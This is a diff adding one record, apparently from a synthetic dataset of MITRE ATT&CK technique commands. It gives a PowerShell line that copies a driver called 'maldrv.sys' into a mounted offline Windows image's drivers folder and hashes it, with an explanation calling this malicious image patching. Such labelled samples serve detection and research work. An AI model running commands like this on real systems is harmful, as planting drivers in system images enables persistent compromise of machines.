@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "Copy-Item 'C:\\staging\\maldrv.sys' 'C:\\mount\\Windows\\System32\\drivers\\maldrv.sys' -Force; certutil -hashfile C:\\mount\\Windows\\System32\\drivers\\maldrv.sys SHA256",
+  "explanation": "Injects an unsigned driver into the offline system image drivers directory and immediately records its hash, demonstrating malicious image patching (T1601) with integrity tracking.",
+  "rationale_steps": [
+    "Copy a malicious driver into the mounted image's drivers folder.",
+    "Hash the inserted file with certutil to log its presence and fingerprint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-dc7ef01c-9901b75a",
+  "source_prompt_hash": "dc7ef01c",
+  "timestamp_utc": "2025-09-30T04:49:19.161651Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
